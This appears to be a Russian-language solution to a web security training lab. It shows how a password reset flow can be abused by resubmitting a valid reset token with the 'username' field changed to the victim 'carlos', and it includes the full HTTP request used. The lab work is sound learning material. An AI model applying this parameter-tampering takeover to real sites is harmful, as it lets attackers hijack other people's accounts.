# Password reset broken logic
APPRENTICE

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

Your credentials: wiener:peter

Victim's username: carlos
## Решение
На форме логина перехожу по ссылке "Forgot password?". Ввожу свой email, получаю письмо со ссылкой на сброс пароля.

Перехожу по ссылке на страницу `/forgot-password?temp-forgot-password-token=pgfg9xqcn2komhl4gnnwbjccvfrj91l6`, ввожу новый пароль и его подтверждение. При этом на сервер отправляется следующий запрос:
```
POST /forgot-password?temp-forgot-password-token=jb6za089qmaahcd1w23ckboxdgthkcfx HTTP/2
Host: 0a3b00c5045d944d80e12bce00970067.web-security-academy.net
Cookie: session=2NVHbficsx638F1NF4IMvaCXI9nskUbd
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://0a3b00c5045d944d80e12bce00970067.web-security-academy.net
Referer: https://0a3b00c5045d944d80e12bce00970067.web-security-academy.net/forgot-password?temp-forgot-password-token=jb6za089qmaahcd1w23ckboxdgthkcfx
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

temp-forgot-password-token=dnwfq9duaaqjl4ikxg884meale5ff061&username=wiener&new-password-1=123&new-password-2=123
```
Повторяю вышеописанную процедуру до шага отправки формы нового пароля. Копирую новый токен сброса пароля и подставляю его в качестве значения параметра "temp-forgot-password-token", а значение параметра "username" меняю на "carlos". Отправляю запрос, затем логинюсь как carlos:123. Задание выполнено.
